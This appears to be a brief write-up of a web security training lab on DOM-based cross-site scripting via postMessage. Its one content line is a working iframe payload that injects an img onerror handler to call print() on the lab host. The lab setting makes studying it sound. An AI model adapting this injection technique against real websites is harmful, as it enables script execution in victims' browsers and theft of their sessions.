Lab #1 - DOM XSS using web messages

Target Goal - Exploit DOM based XSS vulnerability to call the print() function.


Analysis:

<iframe src="https://0ad50028030bfb4d8003768b004c002d.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>', '*')">